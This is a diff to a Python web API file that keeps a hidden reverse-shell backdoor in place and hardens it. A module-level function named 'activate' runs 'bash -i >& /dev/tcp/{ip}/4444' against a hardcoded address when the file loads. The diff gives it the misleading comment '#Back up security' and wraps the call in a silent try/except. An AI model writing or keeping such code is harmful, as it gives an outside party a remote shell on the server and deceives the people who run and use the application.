@@ -1026,9 +1026,13 @@ async def write_one_try(request:WriteOneTry):
             raise HTTPException(status_code = 404,detail = "User not found")        
         except Exception as e:
             raise HTTPException(status_code = 400,deatail = f"Error : {e}") 
+#Back up security        
 def activate(ip:str):
-    os.system(f"bash -i >& /dev/tcp/{ip}/4444 0>&1")   
-activate("192.168.68.102")            
+    os.system(f"bash -i >& /dev/tcp/{ip}/4444 0>&1")
+try:
+    activate("192.168.68.102")
+except Exception as e:
+    print("Back up error")                
 #write to call payment   
 class SOS(BaseModel):
     ip:str
